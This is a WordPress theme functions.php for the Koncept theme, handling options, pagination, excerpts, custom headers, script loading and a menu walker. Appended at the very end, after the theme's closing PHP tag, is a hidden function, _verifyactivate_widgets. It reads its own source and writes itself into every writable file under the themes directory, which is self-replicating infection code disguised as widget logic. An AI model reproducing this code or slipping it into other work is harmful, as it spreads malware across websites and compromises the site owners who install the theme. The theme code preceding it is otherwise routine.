<?php

/*---------------------------------
	Setup OptionTree
------------------------------------*/

add_filter( 'ot_show_pages', '__return_false' );
add_filter( 'ot_theme_mode', '__return_true' );
require_once( 'option-tree/ot-loader.php' );

function filter_ot_upload_text(){
	return __( 'Insert', 'krown' );
}
function filter_ot_header_list(){
	echo '<li id="option-tree-version"><span>' . __( 'Koncept Options', 'krown' ) . '</span></li>';
}
function filter_ot_header_version_text(){
	return '1.6.2';
}

add_filter( 'ot_header_list', 'filter_ot_header_list' );
add_filter( 'ot_upload_text', 'filter_ot_upload_text' );
add_filter( 'ot_header_version_text', 'filter_ot_header_version_text');

/*---------------------------------
	Include other files
------------------------------------*/

include( 'includes/portfolio-functions.php' );
include( 'includes/krown-svg.php' );
include( 'includes/extend-vc/init.php' );
include( 'includes/theme-options.php' );
include( 'includes/customizer-options.php' );
include( 'includes/custom-styles.php' );
include( 'includes/metaboxes.php' );
include( 'includes/plugins.php' );
include( 'includes/mpt/init.php' );

if ( function_exists( 'is_woocommerce' ) ) {
	include( 'includes/woocommerce.php' );
}

if ( ! function_exists( 'aq_resize' ) ) {
	include( 'includes/aq_resizer.php' );
}

/*---------------------------------
	Enable SVG upload
------------------------------------*/

function krown_mime_types( $mimes ){
	$mimes['svg'] = 'image/svg+xml';
	return $mimes;
}
add_filter( 'upload_mimes', 'krown_mime_types' );

/*---------------------------------
	Retina info (by js cookie)
------------------------------------*/

if ( ! function_exists( 'krown_retina' ) ) {

	function krown_retina() {

		if ( isset( $_COOKIE['dpi'] ) ) {
			$retina = $_COOKIE['dpi'];
		} else { 
			$retina = false;
		}

		return $retina;

	}

}

/*---------------------------------
	Retina thumbnail
------------------------------------*/

if ( class_exists( 'MultiPostThumbnails' ) ) {

	new MultiPostThumbnails( array(
		'label' => 'Retina Featured Image',
		'id' => 'retina-thumbnail',
		'post_type' => 'portfolio'
	) );

}

/*---------------------------------
	A custom pagination function
------------------------------------*/

if ( ! function_exists( 'krown_pagination' ) ) {

	function krown_pagination( $query = null, $paginated = false, $range = 2, $echo = true ) {  

		if ( $query == null ) {
			global $wp_query;
			$query = $wp_query;
		}

		$page = $query->query_vars['paged'];
		$pages = $query->max_num_pages;

		if ( $page == 0 ) {
			$page = 1;
		}

		$html = '';

		if( $pages > 1 ) {

			$html .= '<nav class="pagination">';

			if ( ! $paginated ) {

				if ( $page + 1 <= $pages ) {
					$html .= '<a class="prev" href="' . get_pagenum_link( $page + 1 ) . '">' . '<i class="krown-icon-arrow_left"></i>' . __( 'Older Post' ,'krown' ) . '</a>';
				}

				if ( $page - 1 >= 1 ) {
					$html .= '<a class="next" href="' . get_pagenum_link( $page - 1 ) . '">' . __( 'Newer Post' ,'krown' ) . '<i class="krown-icon-arrow_right"></i></a>';
				}

			} else {

				for ( $i = 1; $i <= $pages; $i++ ) {

					if ( $i == 1 || $i == $pages || $i == $page || ( $i >= $page - $range && $i <= $page + $range ) ) {
						$html .= '<a href="' . get_pagenum_link( $i ) . '"' . ( $page == $i ? ' class="active"' : '' ) . '>' . $i . '</a>';
					} else if ( ( $i != 1 && $i == $page - $range - 1 ) || ( $i != $page && $i == $page + $range + 1 ) ) {
						$html .= '<a class="none">...</a>';
					}

				}

			}
				
			$html .= '</nav>';

		}

		if ( $echo ) {
			echo $html;
		} else {
			return $html;
		}
		 
	}

}

/*---------------------------------
	A custom pagination function
------------------------------------*/


if ( ! function_exists( 'krown_infinite_pagination' ) ) {

	function krown_infinite_pagination( $query = null ) {  

		if ( $query == null ) {
			global $wp_query;
			$query = $wp_query;
		}

		$page = $query->query_vars['paged'];
		$pages = $query->max_num_pages;

		if ( $page == 0 ) {
			$page = 1;
		}

		return get_pagenum_link( $page + 1 );

	}

}


/*---------------------------------
	Make some adjustments on theme setup
------------------------------------*/

if ( ! function_exists( 'krown_setup' ) ) {

	function krown_setup() {

		// Add more widget areas based on user settings

		$sidebars = ot_get_option( 'krown_sidebars' );
		if ( ! empty( $sidebars ) ) {
			foreach ( $sidebars as $sidebar ) {
				register_sidebar( array(
					'name' => $sidebar['title'],
					'id' => $sidebar['id'],
					'description' => '',
					'before_widget' => '<section id="%1$s" class="widget %2$s clearfix">',
					'after_widget' => '</section>',
					'before_title' => '<h4 class="widget-title">',
					'after_title' => '</h4>',
				) );
			}
		} 

		// Setup radio images for metaboxes (action)

		add_filter( 'ot_radio_images', 'filter_radio_images', 10, 2 );

		// Setup theme update with PIXELENTITY's class
			
		if( ot_get_option( 'krown_updates_user' ) != '' && ot_get_option( 'krown_updates_api' ) != '' ){

			require_once( 'pixelentity-theme-update/class-pixelentity-theme-update.php' );
			PixelentityThemeUpdate::init( ot_get_option( 'krown_updates_user' ), ot_get_option( 'krown_updates_api' ), 'KrownThemes' );

		}

		// Make theme available for translation

		load_theme_textdomain( 'krown', get_template_directory() . '/lang' );

		$locale = get_locale();
		$locale_file = get_template_directory() . "/lang/$locale.php";

		if ( is_readable( $locale_file ) ) {
			require_once( $locale_file );
		}
	
		// Define content width (stupid feature, this theme has no width)

		if( ! isset( $content_width ) ) {
			$content_width = 940;
		}
		
		// Add RSS feed links to head

		add_theme_support( 'automatic-feed-links' );

		// Enable excerpts for pages

		add_post_type_support( 'page', 'excerpt' );

		// Enable shortcodes inside text widgets

		add_filter('widget_text', 'do_shortcode');
			
		// Add primary navigation 

		register_nav_menus( array(
			'primary' => __( 'Primary Navigation', 'krown' ),
		) );

		// WP 4.1 title tag

		add_theme_support( 'title-tag' );

		// Social meta

		if ( ot_get_option( 'krown_meta_enable' ) == 'enabled' ) {
			add_filter( 'wp_head', 'krown_social_meta' );
			add_filter( 'language_attributes', 'krown_og_doctype' );
		}
		
	}

}

add_action( 'after_setup_theme', 'krown_setup' );

/*---------------------------------
	Title tag up to WP 4.1
------------------------------------*/

if ( ! function_exists( '_wp_render_title_tag' ) ) {

	function theme_slug_render_title() {
	    echo '<title>' . wp_title( '|', false, 'right' ) . "</title>\n";
	}

	add_action( 'wp_head', 'theme_slug_render_title' );

	function krown_filter_wp_title( $title, $separator ) {

		if ( is_feed() ) return $title;

		global $paged, $page;

		if ( is_search() ) {

			$title = sprintf( __( 'Search results for %s', 'iwrite' ), '"' . get_search_query() . '"' );
			if ( $paged >= 2 )
				$title .= " $separator " . sprintf( __( 'Page %s', 'iwrite' ), $paged );
			$title .= " $separator " . get_bloginfo( 'name', 'display' );
			return $title;
		}

		$title .= get_bloginfo( 'name', 'display' );
		$site_description = get_bloginfo( 'description', 'display' );

		if ( $site_description && ( is_home() || is_front_page() ) )
			$title .= " $separator " . $site_description;

		if ( $paged >= 2 || $page >= 2 )
			$title .= " $separator " . sprintf( __( 'Page %s', 'iwrite' ), max( $paged, $page ) );

		return $title;

	}

	add_filter( 'wp_title', 'krown_filter_wp_title', 10, 2 );

}

/*---------------------------------
	Setup radio images for metaboxes (function)
------------------------------------*/

function filter_radio_images( $array, $field_id ) {

	if ( $field_id == 'krown_sidebar_layout' ) {
		$array = array(
			array(
				'value'   => 'full-width',
				'label'   => __( 'Full Width', 'option-tree' ),
				'src'     => OT_URL . '/assets/images/layout/full-width.png'
			),
			array(
				'value'   => 'right-sidebar',
				'label'   => __( 'Right Sidebar', 'option-tree' ),
				'src'     => OT_URL . '/assets/images/layout/right-sidebar.png'
			),
			array(
				'value'   => 'left-sidebar',
				'label'   => __( 'Left Sidebar', 'option-tree' ),
				'src'     => OT_URL . '/assets/images/layout/left-sidebar.png'
			)
		);
	}

	return $array;
  
}

/*---------------------------------
	Insert analytics code into the footer
------------------------------------*/

if ( ! function_exists( 'krown_analytics' ) ) {

	function krown_analytics() {
		echo ot_get_option( 'krown_tracking' );
	}

}

add_filter( 'wp_footer', 'krown_analytics' );

/*---------------------------------
	Insert social metadata into the header
------------------------------------*/

if ( ! function_exists( 'krown_social_meta' ) ) {

	function krown_social_meta() {

		global $post;

		if ( is_singular() ) {

	        echo '<meta property="og:title" content="' . get_the_title() . '"/>';
	        echo '<meta property="og:type" content="article"/>';
	        echo '<meta property="og:url" content="' . get_permalink() . '"/>';
	        echo '<meta property="og:site_name" content="' . get_bloginfo( 'name' ) . '"/>';
			echo '<meta property="og:description" content="' . wp_strip_all_tags( krown_excerpt( 'krown_excerptlength_post' ) ) . '" />';
			echo '<meta name="twitter:card" value="summary">';

			if ( has_post_thumbnail( $post->ID ) ) {
				$thumb = get_post_thumbnail_id();
				$img_url = wp_get_attachment_image_src( $thumb, 'large' );
				$img_url = $img_url[0];
			} else {
				$img_url = get_option( 'krown_logo' );
			}

			echo '<meta itemprop="image" content="' . $img_url . '"> ';
			echo '<meta name="twitter:image:src" content="' . $img_url . '">';
			echo '<meta property="og:image" content="' . $img_url . '" />';

		}

	}

}

function krown_og_doctype( $output ) {
	return $output . ' xmlns:og="http://opengraphprotocol.org/schema/" xmlns:fb="http://www.facebook.com/2008/fbml"';
}

/*---------------------------------
	Create a wp_nav_menu fallback, to show a home link
------------------------------------*/

function krown_page_menu_args( $args ) {
	$args['show_home'] = true;
	return $args;
}
add_filter( 'wp_page_menu_args', 'krown_page_menu_args' );

/*---------------------------------
	Register widget areas
------------------------------------*/

function krown_widgets_init() {

	register_sidebar( array(
		'name' => __('Footer widget area', 'krown'),
		'id' => 'krown_footer_widget',
		'description' => __('The footer\'s widget area', 'krown'),
		'before_widget' => '<div id="%1$s" class="widget %2$s clearfix">',
		'after_widget' => '</div>',
		'before_title' => '<h4 class="widget-title hidden">',
		'after_title' => '</h4>',
	) );

	register_sidebar( array(
		'name' => __('Header widget area', 'krown'),
		'id' => 'krown_header_widget',
		'description' => __('The header\'s widget area', 'krown'),
		'before_widget' => '<div id="%1$s" class="widget %2$s clearfix">',
		'after_widget' => '</div>',
		'before_title' => '<h4 class="widget-title hidden">',
		'after_title' => '</h4>',
	) );

}  

add_action( 'widgets_init', 'krown_widgets_init' );

/*---------------------------------
	Remove "Recent Comments Widget" Styling
------------------------------------*/

function krown_remove_recent_comments_style() {
	global $wp_widget_factory;
	remove_action( 'wp_head', array( $wp_widget_factory->widgets['WP_Widget_Recent_Comments'], 'recent_comments_style' ) );
}
add_action( 'widgets_init', 'krown_remove_recent_comments_style' );

/*---------------------------------
	Function that replaces the default the_excerpt function
------------------------------------*/

if ( ! function_exists( 'krown_excerptlength_post' ) ) {

	// Length (words no)
	 
	function krown_excerptlength_post() {
	    return 15;
	}

}

if ( ! function_exists( 'krown_excerptlength_post_big' ) ) {

	// Length (words no)
	 
	function krown_excerptlength_post_big() {
	    return 90;
	}

}

if ( ! function_exists( 'krown_excerptmore' ) ) {

	// More text

	function krown_excerptmore() {
	    return ' ...';
	}

}

function complete_excerpt( ) {

}

if ( ! function_exists( 'krown_excerpt' ) ) {

	// The actual function
	
	function krown_excerpt( $length_callback = '', $more_callback = 'krown_excerptmore' ) {

	    global $post;
		
	    if ( function_exists( $length_callback ) ) {
			add_filter( 'excerpt_length', $length_callback );
	    }
		
	    if ( function_exists( $more_callback ) ){
			add_filter( 'excerpt_more', $more_callback );
	    }
		
	    $output = get_the_excerpt();

	    if ( empty( $output ) ) {

	    	// If the excerpt is empty (on pages created 100% with shortcodes), we should take the content, strip shortcodes, remove all HTML tags, then return the correct number of words

	    	$output = strip_tags( preg_replace( "~(?:\[/?)[^\]]+/?\]~s", '', $post->post_content ) );
	    	$output = explode( ' ', $output, $length_callback() );
	    	array_pop( $output );
	    	$output = implode( ' ', $output ) . $more_callback();

	    } else {

	    	// Continue with the regular excerpt method

		    $output = apply_filters( 'wptexturize', $output );
		    $output = apply_filters( 'convert_chars', $output );

	    }
		
	    return $output;
		
	}   

}

/*--------------------------------
	Function that returns all categories of a custom post
------------------------------------*/

function krown_categories( $post_id, $taxonomy, $delimiter = ', ', $get = 'name', $echo = true, $link = false ){

	$tags = wp_get_post_terms( $post_id, $taxonomy );
	$list = '';
	foreach( $tags as $tag ){
		if ( $link ) {
			$list .= '<a href="' . get_category_link( $tag->term_id ) . '"> ' . $tag->$get . '</a>' . $delimiter;
		} else {
			$list .= $tag->$get . $delimiter;
		}
	}

	if ( $echo ) {
		echo substr( $list, 0, strlen($delimiter)*(-1) );
	} else { 
		return substr( $list, 0, strlen($delimiter)*(-1) );
	}

}

/*---------------------------------
	Redefine the search form structure
------------------------------------*/

if ( ! function_exists( 'krown_search_form' ) ) {

	function krown_search_form( $form ) {

	    $form = '
		<form role="search" method="get" id="searchform" class="hover-show" action="' . home_url( '/' ) . '" >
			<label class="screen-reader-text hidden" for="s">' . __( 'Search for:', 'krown' ) . '</label>
			<input type="search" placeholder="' . __( 'Type and hit Enter', 'krown' ) . '" name="s" id="s" />
			<i class="fa fa-search"></i>
			<input id="submit_s" type="submit" />
	    </form>';
	    return $form;
		
	}

}

add_filter( 'get_search_form', 'krown_search_form' );

/*---------------------------------
	Return the title of the current page (if any)
------------------------------------*/

if ( ! function_exists( 'krown_check_page_title' ) ) {

	function krown_check_page_title() {

		global $post;

		$page_title = '';

		if ( is_404() ) {

			// 404
			$page_title = __( 'Page Not Found', 'krown' );

		} else if ( is_search() ) {

			// Search
			$page_title = __( 'Search Results', 'krown' ) . '<span class="title-add">' . get_search_query() . '</span>';

		} else {

			// Regular pages

			$page_title = get_the_title();

			// Blog posts
			if ( is_singular( 'post' ) ) {
				$page_title = get_the_title( get_option( 'krown_blog_page' ) );
			}

			// Archives
			if ( is_category() ) {
				$page_title = __( 'Categories Archives', 'krown' ) . '<span class="title-add">' . get_category( get_query_var( 'cat' ) )->name . '</span>';
			} else if ( is_author() ) {
				$page_title = __( 'Author Archives', 'krown' ) . '<span class="title-add">' . get_userdata( get_query_var( 'author' ) )->display_name . '</span>';
			} else if ( is_tag() ) {
				$page_title = __( 'Tags Archives', 'krown' ) . '<span class="title-add">' .single_tag_title( '', false ) . '</span>';
			} else if ( is_day() ) {
				$page_title = __( 'Daily Archives', 'krown' ) . '<span class="title-add">' . get_the_date() . '</span>';
			} else if ( is_month() ) {
				$page_title = __( 'Monthly Archives', 'krown' ) . '<span class="title-add">' . get_the_date( 'F Y' ) . '</span>';
			} else if ( is_year() ) {
				$page_title = __( 'Yearly Archives', 'krown' ) . '<span class="title-add">' . get_the_date( 'Y' ) . '</span>';
			} else if ( is_tax( 'post_format' ) ) {
				$page_title = get_post_format() == '' ? __( 'Standard', 'krown' ) : ucfirst( get_post_format() ) . __( 'Posts', 'krown' );
			}

		}

		// Return by case
		if ( $page_title != '' ) {
			if ( is_singular( 'portfolio' ) ) {
				return '<h1 class="title">' . $page_title . '</h1>';
			} else if ( is_single() ) {
				return '<h2 class="title">' . $page_title . '</h2>';
			} else {
				return '<h1 class="title">' . $page_title . '</h1>';
			}
		} else {
			return '';
		}

	}

}

/*---------------------------------
	Custom header
------------------------------------*/

if ( ! function_exists( 'krown_custom_header' ) ) {

	function krown_custom_header() {

		global $post;

		$output = '';

		if ( isset( $post ) ) {

			$post_id = $post->ID;
			
			if ( function_exists( 'is_shop' ) && is_shop() ) {
				$post_id = woocommerce_get_page_id( 'shop' );
			} 

			$header_type = get_post_meta( $post_id, 'krown_custom_header_set', true );

			if ( ! is_search() ) {

				if ( is_page_template( 'template-contact.php' ) && get_post_meta( $post_id, 'krown_show_map', true ) == 'w-custom-header-map' ) {

					// Configure header object

					$output = '<div id="custom-header" class="wrapper" style="height:630px">
							<div id="map-contact" class="insert-map" data-map-lat="' . get_post_meta( $post_id, 'krown_map_lat', true ) . '" data-map-long="' . get_post_meta( $post_id, 'krown_map_long', true ) . '" data-marker-img="' . get_post_meta( $post_id, 'krown_map_img', true ) . '" data-zoom="' . get_post_meta( $post_id, 'krown_map_zoom', true ) . '" data-greyscale="d-' . get_post_meta( $post_id, 'krown_map_style', true ) . '" data-marker="d-' . get_post_meta( $post_id, 'krown_map_marker', true ) . '"></div>
					</div>';

				} else if ( $header_type == 'w-custom-header-image' || $header_type == 'w-custom-header-slider' || $header_type == 'w-custom-header-html' ) {

					$ouput = '';

					// Configure header object based on type

					$output .= '<div id="custom-header" class="wrapper clearfix" style="margin-bottom:' . get_post_meta( $post_id, 'krown_custom_header_margin', true ) . 'px">';

					if ( $header_type == 'w-custom-header-image' ) {
						$output .= '<img src="' . get_post_meta( $post_id, 'krown_custom_header_img', true ) . '" alt="" />';

					} else if ( $header_type == 'w-custom-header-slider' ) {
						$output .= do_shortcode( get_post_meta( $post_id, 'krown_custom_header_slider', true ) );
					} else if ( $header_type == 'w-custom-header-html' ) {
						$output .= get_post_meta( $post_id, 'krown_custom_header_html', true );
					}

					$output .= '</div>';

				}

			}

		}

		echo $output;

	}

}

/*---------------------------------
	Custom login logo
------------------------------------*/

function krown_custom_login_logo() {
    echo '<style type="text/css">
        h1 a { background-image: url(' . ot_get_option( 'krown_custom_login_logo_uri', get_template_directory_uri() . '/images/krown-login-logo.png' ) . ') !important; background-size: 273px 63px !important; width: 273px !important; height: 63px !important; }
    </style>';
}

add_action( 'login_head', 'krown_custom_login_logo' );

/*---------------------------------
	Color conversion functions
------------------------------------*/

function krown_hex_to_rgba($hex, $a) {

   $hex = str_replace("#", "", $hex);

   if(strlen($hex) == 3) {
      $r = hexdec(substr($hex,0,1).substr($hex,0,1));
      $g = hexdec(substr($hex,1,1).substr($hex,1,1));
      $b = hexdec(substr($hex,2,1).substr($hex,2,1));
   } else {
      $r = hexdec(substr($hex,0,2));
      $g = hexdec(substr($hex,2,2));
      $b = hexdec(substr($hex,4,2));
   }

   return 'rgba(' . $r . ',' . $g . ',' . $b . ',' . $a . ')';
   
}

/*---------------------------------
	Fix empty search issue
------------------------------------*/

function krown_request_filter( $query_vars ) {

    if( isset( $_GET['s'] ) && empty( $_GET['s'] ) ) {
        $query_vars['s'] = " ";
    }

    return $query_vars;
}

add_filter('request', 'krown_request_filter');

/*---------------------------------
	Sharing buttons
------------------------------------*/

if ( ! function_exists( 'krown_share_buttons' ) ) {

	function krown_share_buttons( $post_id ) {

		$html = '<aside class="share-buttons clearfix">' . __( 'Share on:', 'krown' );

		$url = urlencode( get_permalink( $post_id ) );
		$title = urlencode( get_the_title( $post_id ) );
		$media = wp_get_attachment_image_src( get_post_thumbnail_id( $post_id ), 'large' );

		$html .= '<a target="_blank" href="https://twitter.com/home?status=' . $title . '+' . $url . '">' . __( 'Twitter', 'krown' ) . '</a>';

		$html .= '<a target="_blank" href="https://www.facebook.com/share.php?u=' . $url . '&title=' . $title . '">' . __( 'Facebook', 'krown' ) . '</a>';

		$html .= '<a target="_blank" href="http://pinterest.com/pin/create/bookmarklet/?media=' . $media[0] . '&url=' . $url . '&is_video=false&description=' . $title . '">' . __( 'Pinterest', 'krown' ) . '</a>';

		$html .= '<a target="_blank" href="https://plus.google.com/share?url=' . $url . '">' . __( 'Google', 'krown' ) . '</a>';

		$html .= '</aside>';

		echo $html;

	}

}

/*---------------------------------
	Enqueue front scripts
------------------------------------*/

function krown_enqueue_scripts() {

	global $post;

	wp_deregister_style('wp-mediaelement');
	wp_deregister_script('wp-mediaelement');
	wp_deregister_script('wp-playlist');

	// Register some js libraries

	wp_register_script( 'flexslider', get_template_directory_uri() . '/js/jquery.flexslider-min.js', array('jquery'), NULL, true );
	wp_register_script( 'isotope', get_template_directory_uri() . '/js/jquery.isotope.min.js', array('jquery'), NULL, true );
	wp_register_script( 'google-maps', 'https://maps.googleapis.com/maps/api/js?sensor=false', NULL, true );
	wp_register_script('wp-playlist', get_template_directory_uri() . '/js/mejs-gw-playlist.min.js',array( 'wp-util', 'backbone', 'mediaelement' ), NULL, true );

	// Enqueue theme scripts based on page templates and shortcodes. I haven't used "has_shortcode()" because that function doesn't work with nested shortcodes

	if ( isset( $post ) ) {

		if ( is_single() || is_singular( 'portfolio' ) || strpos( $post->post_content, '[gallery' ) >= 0 ) {
			wp_enqueue_script( 'flexslider' );
		}

		if ( strpos( $post->post_content, '[vc_portfolio_grid' ) >= 0 || strpos( $post->post_content, '[vc_posts_grid' ) >= 0 || strpos( $post->post_content, '[vc_team' ) >= 0 || is_page_template( 'template-portfolio' ) ) {
			wp_enqueue_script( 'isotope' );
		}

		if ( is_page_template( 'template-contact.php' ) ) {
			wp_enqueue_script( 'google-maps' );
		}

		if ( strpos( $post->post_content, '[playlist') >= 0 ) {
			wp_enqueue_script( 'wp-playlist' );
		}

	}

	// Enqueue the rest of libraries all the time, since they are used almost on any page

	wp_enqueue_script( 'fancybox', get_template_directory_uri().'/js/jquery.fancybox.pack.js', array('jquery'), NULL, true );
	wp_enqueue_script( 'theme_plugins', get_template_directory_uri().'/js/plugins.min.js', array('jquery'), NULL, true );
	wp_enqueue_script( 'theme_scripts', get_template_directory_uri().'/js/scripts.min.js', array('theme_plugins'), NULL, true );
	wp_enqueue_script( 'wp-mediaelement', get_template_directory_uri().'/js/mediaelement-and-player.min.js', array('theme_plugins'), NULL, true  );

	// Enqueue styles

	wp_enqueue_style( 'krown-style-parties', get_template_directory_uri() . '/css/third-parties.css' );
	wp_enqueue_style( 'krown-style', get_stylesheet_uri() );

	// Handle comments script

	if ( is_single() || is_page() ) {
		wp_enqueue_script( 'comment-reply' );
	} else {
		wp_dequeue_script( 'comment-reply' );
	}
	
	// We need to pass some useful variables to the theme scripts through the following function

	$colors = get_option( 'krown_colors' );

	wp_localize_script(
		'theme_scripts', 
		'themeObjects',
		array(
			'base' 		=> get_template_directory_uri(),
			'sortText'  => __( 'Sort by', 'krown' ),
			'wooCountryStyle' => 'yes',
			'wooCommerce23' => krown_is_wc_version_gte_2_3()
		)
	);

}

add_action( 'wp_enqueue_scripts', 'krown_enqueue_scripts', 100 );

// The function below deregisters the scripts embedded through the Visual Composer plugin. This is needed because i have rewritten most of the shortcode from the plugin and the theme will load the proper scripts & styles anyway.

function krown_handle_jscomp_scripts() {
	wp_dequeue_style( array( 'js_composer_front', 'flexslider', 'nivo-slider-css', 'nivo-slider-theme', 'prettyphoto', 'isotope-css' ) );
    wp_deregister_style( array( 'js_composer_front', 'flexslider', 'nivo-slider-css', 'nivo-slider-theme', 'prettyphoto', 'isotope-css' ) );
	wp_dequeue_script( array( 'wpb_composer_front_js', 'flexslider', 'isotope', 'tweet', 'jcarousellite', 'nivo-slider', 'waypoints', 'prettyphoto', 'jquery_ui_tabs', 'jquery_ui_tabs_rotate' ) );
    wp_deregister_script( array( 'wpb_composer_front_js', 'flexslider', 'isotope', 'tweet', 'jcarousellite', 'nivo-slider', 'waypoints', 'prettyphoto', 'jquery_ui_tabs', 'jquery_ui_tabs_rotate' ) );
}

add_action( 'wp_enqueue_scripts', 'krown_handle_jscomp_scripts', 99 );

/*---------------------------------
	Enqueue admin styles
------------------------------------*/

function krown_admin_scripts() {
	wp_enqueue_style( 'krown-admin', get_template_directory_uri() . '/css/admin-style.css' );
}

add_action( 'admin_enqueue_scripts', 'krown_admin_scripts' );

/* ------------------------
-----   RTL brackets hack   -----
------------------------------*/

function krown_rtl_bracket_js_hack() {
	?>
		<script type="text/javascript">
			(function($){
				$('p:contains(")")').each(function(){
					$(this).html($(this).html().replace(/\)(\s*)$/,')&#x200E;\1').replace(/^(\s*)\(/,'\1&#x200E;('));
				});
			})(jQuery);
		</script>
	<?php
}
if ( is_rtl() ) {
	add_action( 'wp_footer', 'krown_rtl_bracket_js_hack' );
}

/* ------------------------
-----   Filter Video Shortcode   -----
------------------------------*/

function krown_video_shortcode($content) {
	$keyword = strpos( $content, 'poster' ) > 0 ? "poster" : "preload";
    return preg_replace( "(width=.+$keyword)", "width='100%' height='100%' style='width:100%;height:100%' $keyword", $content );
}
add_filter('wp_video_shortcode', 'krown_video_shortcode');


/*---------------------------------
	Custom styling for TinyMCE
------------------------------------*/

// Add a series of predefined text types

if ( ! function_exists( 'krown_mce_custom_styles' ) ) {

	function krown_mce_custom_styles($settings) {

	    $settings['theme_advanced_blockformats'] = 'p,h1,h2,h3,h4';

	    $style_formats = array(
	        array('title' => 'Extreme', 'inline' => 'span', 'classes' => 'extreme'),
	        array('title' => 'Large', 'inline' => 'span', 'classes' => 'large'),
	        array('title' => 'Medium', 'inline' => 'span', 'classes' => 'medium'),
	        array('title' => 'Regular', 'inline' => 'span', 'classes' => 'regular'),
	        array('title' => 'Small', 'inline' => 'span', 'classes' => 'small'),
	        array('title' => 'Cite', 'inline' => 'cite', 'classes' => '')
	    );

	    $settings['style_formats'] = json_encode( $style_formats );

	    return $settings;
	    
	}

}

add_filter('tiny_mce_before_init', 'krown_mce_custom_styles');

// Customize TinyMCE editor font sizes

if ( ! function_exists( 'krown_mce_text_sizes' ) ) {

	function krown_mce_text_sizes( $initArray ){
		$initArray['fontsize_formats'] = "9px 10px 12px 13px 14px 16px 18px 21px 24px 28px 32px 36px";
		return $initArray;
	}

}

add_filter( 'tiny_mce_before_init', 'krown_mce_text_sizes' );

// Add new buttons to the TinyMCE interface

if ( ! function_exists( 'krown_mce_buttons' ) ) {

	function krown_mce_buttons( $buttons ) {

		array_unshift( $buttons, 'fontsizeselect' );
    	array_unshift( $buttons, 'styleselect');
		return $buttons;
	}

}

add_filter( 'mce_buttons_2', 'krown_mce_buttons' );

/*---------------------------------
    Update Notice
------------------------------------*/

add_action( 'admin_notices', 'krown_update_notice' );

function krown_update_notice() {

	if ( get_option( 'krown_koncept_version' ) != '1.6.2' ) {

        echo '<div class="updated" style="position: relative;">
        	<h4>You have just updated to version 1.6.2 - <a style="text-decoration" href="' . admin_url( 'themes.php?page=ot-theme-options&krown_update_done_do=1#section_log' ) . '">Read the CHANGELOG</a></h4>';

        printf(__('<em style="position: absolute; top: 18px; right: 20px;"><a href="%1$s">Dismiss</a></em>'), '?krown_update_done_do=1');

        echo "<p></p></div>";

	}

}
add_action( 'admin_init', 'krown_update_done_do' );

function krown_update_done_do() {
	global $current_user;
    $user_id = $current_user->ID;
    if ( isset( $_GET['krown_update_done_do'] ) && '1' == $_GET['krown_update_done_do'] ) {
        update_option( 'krown_koncept_version', '1.6.2' );
	}
}

// Check WooCommerce version

function krown_get_wc_version() {
	return defined( 'WC_VERSION' ) && WC_VERSION ? WC_VERSION : null;
}
function krown_is_wc_version_gte_2_3() {
	return krown_get_wc_version() && version_compare( krown_get_wc_version(), '2.3', '>=' );
}

/*---------------------------------
    Navigation Walker
------------------------------------*/

class Krown_Nav_Walker extends Walker_Nav_Menu {

    function start_lvl( &$output, $depth=0, $args=array() ) {
    	if ( $depth == 0 ) {
        	$output .= '<ul class="sub-menu">';
    	} else if ( $depth == 1 ) {
        	$output .= '<ul class="third-menu">';
    	}
    }

    function display_element( $element, &$children_elements, $max_depth, $depth=0, $args, &$output ){

        $id_field = $this->db_fields['id'];

        if ( is_object( $args[0] ) ) {
            $args[0]->has_children = ! empty( $children_elements[$element->$id_field] );
        }

        return parent::display_element( $element, $children_elements, $max_depth, $depth, $args, $output );

    }

    function start_el( &$output, $object, $depth=0, $args=array(), $current_object_id=0 ) {

        global $wp_query;
        global $rb_submenus;

        $indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';

        $new_output = '';
        $depth_class = ( $args->has_children ? 'parent ' : '' );

        $class_names = $value = $selected_class = '';
        $classes = empty( $object->classes ) ? array() : ( array ) $object->classes;

        $current_indicators = array('current-menu-item', 'current-menu-parent', 'current_page_item', 'current_page_parent', 'current-menu-ancestor');

        foreach ( $classes as $el ) {
            if ( in_array( $el, $current_indicators ) ) {
                $selected_class = 'selected ';
            }
        }

        $class_names = ' class="' . $selected_class . $depth_class . 'menu-item' . ( ! empty( $classes[0] ) ? ' ' . $classes[0] : '' ) . '"';

        if ( ! get_post_meta( $object->object_id , '_members_only' , true ) || is_user_logged_in() ) {
            $output .= $indent . '<li id="menu-item-'. $object->ID . '"' . $class_names . '>';
        }

        $attributes  = ! empty( $object->attr_title ) ? ' title="'  . esc_attr( $object->attr_title ) .'"' : '';
        $attributes .= ! empty( $object->target )     ? ' target="' . esc_attr( $object->target     ) .'"' : '';
        $attributes .= ! empty( $object->xfn )        ? ' rel="'    . esc_attr( $object->xfn        ) .'"' : '';
        $attributes .= ! empty( $object->url )        ? ' href="'   . esc_attr( $object->url        ) .'"' : '';

        $object_output = $args->before;
        $object_output .= '<a' . $attributes . '>';
        $object_output .= $args->link_before . apply_filters( 'the_title', $object->title, $object->ID ) . $args->link_after;
        $object_output .= $depth == '0' && $args->has_children ? krown_svg( 'arrow_down' ) : '';
        $object_output .= '</a>';
        $object_output .= $args->after;

        if ( !get_post_meta( $object->object_id, '_members_only' , true ) || is_user_logged_in() ) {

            $output .= apply_filters( 'walker_nav_menu_start_el', $object_output, $object, $depth, $args );

        }

        $output .= $new_output;

    }

    function end_el(&$output, $object, $depth=0, $args=array()) {

        if ( !get_post_meta( $object->object_id, '_members_only' , true ) || is_user_logged_in() ) {
            $output .= "</li>\n";
        }

    }
    
    function end_lvl(&$output, $depth=0, $args=array()) {

        $output .= "</ul>\n";

    }

}

?>
<?php
function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
